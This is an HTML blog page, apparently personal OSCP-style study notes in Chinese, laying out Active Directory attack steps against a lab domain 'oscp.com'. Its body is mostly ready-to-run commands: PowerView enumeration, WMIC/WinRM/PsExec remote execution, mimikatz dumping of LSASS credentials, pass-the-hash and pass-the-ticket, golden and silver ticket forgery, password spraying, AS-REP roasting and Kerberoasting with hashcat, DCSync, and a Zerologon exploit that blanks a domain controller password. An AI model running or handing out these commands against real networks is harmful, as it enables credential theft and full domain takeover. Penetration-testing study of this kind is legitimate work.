@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href="//cdn.staticfile.org/Primer/21.0.7/primer.css" rel="stylesheet" />
+    <link rel="icon" href="https://cos.kevinc.ltd/file/download?fileId=1419">
+    <script>
+        if(localStorage.getItem("meek_theme")==null){}
+        else if(localStorage.getItem("meek_theme")=="dark"){document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="dark";}
+        else if(localStorage.getItem("meek_theme")=="light"){document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="light";}
+    </script>
+    
+<title>简单域渗透操作</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<span class="postTitle">简单域渗透操作</span>
+<div class="title-right">
+
+    <a href="/"><button id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd" d="M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z"></path>
+        </svg>
+    </button></a>
+
+    <a href="https://github.com/cha0s32/cha0s32.github.io/issues/13" target="_blank"><button class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd" d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+        </svg>
+    </button></a>
+
+    <button class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </button>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody">
+<h2>信息收集</h2>
+<div class="highlight highlight-source-shell"><pre class="notranslate">net user /domain
+net group /domain
+net group <span class="pl-s"><span class="pl-pds">"</span>Domain Admins<span class="pl-pds">"</span></span> /domain
+<span class="pl-c"><span class="pl-c">#</span> 这种方法没办法收集到组的嵌套关系</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 可以使用PowerView</span>
+Import-Module .<span class="pl-cce">\P</span>owerView.ps1
+Get-Netdomain
+Get-NetUser <span class="pl-k">|</span> <span class="pl-k">select</span> <span class="pl-smi">cn</span> 
+
+<span class="pl-c"><span class="pl-c">#</span> 思路是找高权限用户，找哪一台主机有该用户的登录会话，用普通用户去连那台主机，找内存的hash</span>
+Get-NetGroup <span class="pl-k">|</span> <span class="pl-k">select</span> <span class="pl-smi">cn</span>
+Get-NetGroup <span class="pl-s"><span class="pl-pds">"</span>Domain Admins<span class="pl-pds">"</span></span> <span class="pl-k">|</span> <span class="pl-k">select</span> <span class="pl-smi">member</span>
+Get-NetComputer <span class="pl-k">|</span> <span class="pl-k">select</span> <span class="pl-smi">cn,operationsystem,dnshostname</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 寻找普通用户在哪台机器上有本地管理员权限</span>
+Find-LocalAdminAccess
+Get-NetSession <span class="pl-c"><span class="pl-c">#</span>域当中所有主机当前的会话</span>
+Get-NetSession -ComputerName User1 <span class="pl-c"><span class="pl-c">#</span> 查看User1中存在的会话</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 查看账户绑定的spn</span>
+Get-NetUser -SPN <span class="pl-k">|</span> <span class="pl-k">select</span> <span class="pl-smi">cn,serviceprincipalname</span>
+<span class="pl-c"><span class="pl-c">#</span> 可以针对SPN服务账号的名称进行密码爆破</span>
+
+<span class="pl-c"><span class="pl-c">#</span>看看解析成什么IP</span>
+nslookup
+
+
+<span class="pl-c"><span class="pl-c">#</span> 找域当中所有主机上的文件共享</span>
+Find-DomainShare
+<span class="pl-c"><span class="pl-c">#</span> 有一个文件共享必定存在 \\域名</span>
+<span class="pl-cce">\\</span>oscp.com <span class="pl-c"><span class="pl-c">#</span> 找一个SYSVOL，域当中的策略都在里面</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 各种信息收集可以用SharpHound</span>
+
+</pre></div>
+<h2>远程登录</h2>
+<h3>WMIC</h3>
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在远程主机user1执行命令</span>
+wmic <span class="pl-k">/</span>node:user1 <span class="pl-k">process</span> call create <span class="pl-s"><span class="pl-pds">"</span>cmd<span class="pl-pds">"</span></span> <span class="pl-c"><span class="pl-c">#</span> 现在登录的账号对远程主机有管理员权限，登录域的时候做一次身份认证后，执行命令不需要继续认证了</span>
+wmic <span class="pl-k">/</span>node:<span class="pl-c1">10.0</span>.<span class="pl-c1">2.94</span> <span class="pl-k">/</span>user:oscp\alice <span class="pl-k">/</span>password:Password2 <span class="pl-k">process</span> call create <span class="pl-s"><span class="pl-pds">"</span>cmd<span class="pl-pds">"</span></span>
+
+
+<span class="pl-c"><span class="pl-c">#</span> kali传输文件新方式</span>
+mkdir p
+impacket<span class="pl-k">-</span>smbserver <span class="pl-k">-</span>smb2support p
+
+<span class="pl-c"><span class="pl-c">#</span> 然后在windows上访问\\kali-ip, 然后把要共享的文件拖进去</span>
+<span class="pl-c"><span class="pl-c">#</span> 反弹shell可以用谷安提供的encode.py生成payload</span></pre></div>
+<h3>WINRM</h3>
+<p>端口：5985、5986</p>
+<p>平时如果用wmic远程连接可以成功，就不需要用到winrm，如果wmic不能用，可以看看5985、5986端口有没有开</p>
+<p>windows默认winrm没启动</p>
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 管理员权限</span>
+<span class="pl-c1">Enable-PSRemoting</span> <span class="pl-k">-</span>force
+netstat <span class="pl-k">-</span>ano <span class="pl-c"><span class="pl-c">#</span> 看看端口起了没</span>
+
+winrs <span class="pl-k">-</span>r:user1 <span class="pl-s"><span class="pl-pds">"</span>cmd /c hostname &amp; whoami<span class="pl-pds">"</span></span>
+<span class="pl-c"><span class="pl-c">#</span> 非域环境</span>
+winrs <span class="pl-k">-</span>r:user1 <span class="pl-k">-</span>u:oscp\alice <span class="pl-k">-</span>p:Password <span class="pl-s"><span class="pl-pds">"</span>cmd /c ipconfig<span class="pl-pds">"</span></span>
+
+<span class="pl-c"><span class="pl-c">#</span> 使用powershell调用winrm</span>
+<span class="pl-c1">New-PSSession</span> <span class="pl-k">-</span>ComputerName user1
+<span class="pl-c1">Enter-PSSession</span> <span class="pl-c1">1</span></pre></div>
+<h3>PsExec</h3>
+<div class="highlight highlight-source-powershell"><pre class="notranslate">.\<span class="pl-c1">PsExec64.exe</span> <span class="pl-k">-</span>i \\user1 cmd</pre></div>
+<h2>横向渗透</h2>
+<h3>PTH</h3>
+<p>机器上存在高权限的本地账号会话的话，密码的hash会缓存在机器的lssas内存中</p>
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-c1">mimikatz.exe</span> 
+privilege::debug
+sekurlsa:logonpassword</pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> kali</span>
+
+impacket-wmiexec -hashes :hash administrator@10.0.2.92</pre></div>
+<h3>Over PTH</h3>
+<p>在本机上，利用已经获得的hash，给自己申请一个域管理员账号的票据，然后可以登录域的任何一台主机</p>
+<div class="highlight highlight-source-powershell"><pre class="notranslate">sekurlsa::pth <span class="pl-k">/</span>user:administrator <span class="pl-k">/</span>domain:<span class="pl-c1">oscp.com</span> <span class="pl-k">/</span>ntlm:hash <span class="pl-k">/</span>run:powershell
+<span class="pl-c"><span class="pl-c">#</span> 以管理员的身份打开了powershell</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 打开工具包,已经有管理员的票据了</span>
+<span class="pl-c1">PsExec64.exe</span> \\dc1 cmd</pre></div>
+<h3>PTT</h3>
+<p>服务票据可以从一台机器导入到另一台机器中</p>
+<p>Bob可以访问文件共享，Alice不行，但是Alice可以在Bob这台机器中有管理员权限，可以从Bob机器上导出服务票据，导入到Alice的机器中，让Alice有权限访问文件共享</p>
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>Bob</span>
+
+sekurlsa::tickets <span class="pl-k">/</span>export
+<span class="pl-c"><span class="pl-c">#</span> 会在 mimikatz 当前目录</span>
+<span class="pl-c"><span class="pl-c">#</span> 拷贝票据到另一台机器</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 票据导入</span>
+kerberos::ptt 票据文件名
+<span class="pl-c"><span class="pl-c">#</span> 导入后就有文件共享的权限了</span></pre></div>
+<h2>持久化</h2>
+<h3>金票伪造</h3>
+<p>管理员把密码改了，无法通过PTH来进行登录，可以伪造一张TGT来进行持久化</p>
+<p>TGT通过krbtgt的hash来加密，所以伪造TGT需要知道krbtgt的hash</p>
+<p>需要的东西：</p>
+<ul>
+<li>域的SID</li>
+<li>krbtgt的hash</li>
+<li>域当中任何一个用户的用户名</li>
+</ul>
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> SID</span>
+
+whoami <span class="pl-k">/</span>user
+
+<span class="pl-c"><span class="pl-c">#</span> krbtgt 需要有域管理员的权限</span>
+<span class="pl-c1">mimikatz.exe</span>
+privilege::debug
+lsadump::lsa <span class="pl-k">/</span>patch
+
+<span class="pl-c"><span class="pl-c">#</span> 伪造金票</span>
+kerberos::purge <span class="pl-c"><span class="pl-c">#</span> 清理票据</span>
+kerberos::golden <span class="pl-k">/</span>user:bob <span class="pl-k">/</span>domain:<span class="pl-c1">oscp.com</span> <span class="pl-k">/</span>sid:domain<span class="pl-k">-</span>sid <span class="pl-k">/</span>krbtgt:hash <span class="pl-k">/</span>ptt
+
+<span class="pl-c"><span class="pl-c">#</span> 已经是管理员了</span>
+misc::cmd <span class="pl-c"><span class="pl-c">#</span> 打开一个cmd</span>
+</pre></div>
+<h2>攻击AD域</h2>
+<h3>Spray Password</h3>
+<p>域中密码爆破有阈值，所以反过来用密码破解用户名</p>
+<div class="highlight highlight-source-powershell"><pre class="notranslate">powershell <span class="pl-k">-</span>ep bypass
+.\Spray<span class="pl-k">-</span>Passwords.ps1 <span class="pl-k">-</span>Pass Password1
+
+<span class="pl-c"><span class="pl-c">#</span> kali下也有这种类型的工具</span>
+crackmapexec smb <span class="pl-c1">10.0</span>.<span class="pl-c1">2.94</span> <span class="pl-k">-</span>u user.txt <span class="pl-k">-</span>p Password1 <span class="pl-k">-</span>d <span class="pl-c1">oscp.com</span></pre></div>
+<h3>AS-REP(Pre Auth)</h3>
+<p>一般用户拿到TGT之前是会经过DC的预身份认证</p>
+<p>若DC中给某个管理员账户取消了预身份认证，该用户可以直接得到TGT，可以用所有用户向DC发一个身份认证的请求，返回的信息若有用某个账号hash加密的会话密钥，可以对密钥进行解密</p>
+<p>要实现这种攻击：需要有一个普通的账号和密码</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">impacket-GetNPUsers --dc-ip 10.0.2.91 -request -outputfile hash.txt oscp.com/Bob 
+<span class="pl-c"><span class="pl-c">#</span> 输入密码</span>
+Password1
+
+<span class="pl-c"><span class="pl-c">#</span> hash.txt 返回的是用alice的hash加密的信息</span>
+<span class="pl-c1">hash</span> --help <span class="pl-k">|</span> grep -i kerberos
+hashcat -m 18200 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.txt
+<span class="pl-c"><span class="pl-c">#</span> -r 是规则文件</span></pre></div>
+<h3>Kerberosting(SPN)</h3>
+<p>针对SPN的弱密码来进行攻击</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">impacket-GetNuserSPNs -request -dc-ip 10.0.2.91 oscp.com/bob <span class="pl-c"><span class="pl-c">#</span> 知道一个域中普通账号密码就行</span>
+<span class="pl-c"><span class="pl-c">#</span> 输入密码</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 获取由服务账号hash加密的密文 将它生成h.txt</span>
+hashcat -m 13100 h.txt rockyou.txt -r /usr/share/hashcat/rules/best64.txt
+<span class="pl-c"><span class="pl-c">#</span> 获得sqladmin的账号，是域管理理员组的成员</span></pre></div>
+<h3>银票</h3>
+<p>用来做提权的</p>
+<p>需要：SPN服务账号的密码（如获取明文，可以把它加密成 nt hash)，SPN名，域的SID</p>
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-c1">mimikatz.exe</span>
+privilege::debug
+kerberos::golden <span class="pl-k">/</span>sid:domain_sid <span class="pl-k">/</span>domain:<span class="pl-c1">oscp.com</span> <span class="pl-k">/</span>ptt <span class="pl-k">/</span>target:<span class="pl-c1">www.oscp.com</span> <span class="pl-k">/</span>service:http <span class="pl-k">/</span>rc4:spn_hash <span class="pl-k">/</span>user:bob</pre></div>
+<h3>DC同步</h3>
+<p>一旦获得域控制器的管理员权限，可以把所有账号的hash一次性dump下来</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">impacket-secretdump oscp.com/administrator:<span class="pl-s"><span class="pl-pds">"</span>Passw0rd<span class="pl-pds">"</span></span>@10.0.2.91</pre></div>
+<p>原本是DC之间用来同步的机制，但是由于没有验证来源主机，所以只要管理员账号密码提供正确，即可dump下来</p>
+<h3>Zerologon</h3>
+<p>什么信息都收集不了，但是Server 2016没有打补丁的话，有这个漏洞</p>
+<p>工具网上搜索<code class="notranslate">Github ricksense zerologon</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">cd</span> zerologon
+python set_empty_pw.py dc1 10.0.2.91
+
+<span class="pl-c"><span class="pl-c">#</span> 参考zerologon的github项目，可以把所有账号的hash 都dump下来</span>
+impacket-secretdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 <span class="pl-s"><span class="pl-pds">'</span>oscp.com/dc1@10.0.2.91<span class="pl-pds">'</span></span></pre></div>
+</div>
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+</div>
+    <div id="footer">Copyright © <span id="year"></span><a href="https:/cha0s32.github.io"> 呆毛的博客 </a>
+<p>
+<span id="runday"></span>Powered by <a href="https://github.com/Meekdai/Gmeek" target="_blank">Gmeek</a>
+</p>
+
+<script>
+if(""!=""){
+    var now=new Date();
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("year").innerHTML=now.getFullYear();
+    if(""!=""){document.getElementById("runday").innerHTML=" • "+"网站运行"+diffDay+"天"+" • ";}
+    else{document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";}
+}
+</script>
+</div>
+</body>
+<script>
+var IconList={'post': 'M0 3.75C0 2.784.784 2 1.75 2h12.5c.966 0 1.75.784 1.75 1.75v8.5A1.75 1.75 0 0 1 14.25 14H1.75A1.75 1.75 0 0 1 0 12.25Zm1.75-.25a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-8.5a.25.25 0 0 0-.25-.25ZM3.5 6.25a.75.75 0 0 1 .75-.75h7a.75.75 0 0 1 0 1.5h-7a.75.75 0 0 1-.75-.75Zm.75 2.25h4a.75.75 0 0 1 0 1.5h-4a.75.75 0 0 1 0-1.5Z', 'link': 'm7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z', 'about': 'M10.561 8.073a6.005 6.005 0 0 1 3.432 5.142.75.75 0 1 1-1.498.07 4.5 4.5 0 0 0-8.99 0 .75.75 0 0 1-1.498-.07 6.004 6.004 0 0 1 3.431-5.142 3.999 3.999 0 1 1 5.123 0ZM10.5 5a2.5 2.5 0 1 0-5 0 2.5 2.5 0 0 0 5 0Z', 'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'search': 'M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z', 'rss': 'M2.002 2.725a.75.75 0 0 1 .797-.699C8.79 2.42 13.58 7.21 13.974 13.201a.75.75 0 0 1-1.497.098 10.502 10.502 0 0 0-9.776-9.776.747.747 0 0 1-.7-.798ZM2.84 7.05h-.002a7.002 7.002 0 0 1 6.113 6.111.75.75 0 0 1-1.49.178 5.503 5.503 0 0 0-4.8-4.8.75.75 0 0 1 .179-1.489ZM2 13a1 1 0 1 1 2 0 1 1 0 0 1-2 0Z', 'upload': 'M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 13.25 14Z M11.78 4.72a.749.749 0 1 1-1.06 1.06L8.75 3.811V9.5a.75.75 0 0 1-1.5 0V3.811L5.28 5.78a.749.749 0 1 1-1.06-1.06l3.25-3.25a.749.749 0 0 1 1.06 0l3.25 3.25Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z'};
+var utterancesLoad=0;
+if(localStorage.getItem("meek_theme")==null){localStorage.setItem("meek_theme","light");changeLight();}
+else if(localStorage.getItem("meek_theme")=="dark"){changeDark();}
+else if(localStorage.getItem("meek_theme")=="light"){changeLight();}
+
+function changeDark(){
+    document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="dark";
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList["moon"]);
+    document.getElementById("themeSwitch").parentNode.style.color="#00f0ff";
+    if(utterancesLoad==1){utterancesTheme("dark-blue");}
+}
+function changeLight(){
+    document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="light";
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList["sun"]);
+    document.getElementById("themeSwitch").parentNode.style.color="#ff5000";
+    if(utterancesLoad==1){utterancesTheme("github-light");}
+}
+function modeSwitch(){
+    if(document.getElementsByTagName("html")[0].attributes[0].value=="light"){changeDark();localStorage.setItem("meek_theme","dark");}
+    else{changeLight();localStorage.setItem("meek_theme","light");}
+}
+function utterancesTheme(theme){
+    const message = {type: 'set-theme',theme: theme};
+    const iframe = document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message, 'https://utteranc.es');
+}
+
+console.log("\n %c Gmeek last %c https://github.com/Meekdai/Gmeek \n\n", "color: #fff; background-image: linear-gradient(90deg, rgb(47, 172, 178) 0%, rgb(45, 190, 96) 100%); padding:5px 1px;", "background-image: linear-gradient(90deg, rgb(45, 190, 96) 0%, rgb(255, 255, 255) 100%); padding:5px 0;");
+</script>
+
+<script>
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","cha0s32/cha0s32.github.io");
+    script.setAttribute("issue-term","title");
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else{script.setAttribute("theme","github-light");}
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+</script>
+
+
+
+
+</html>
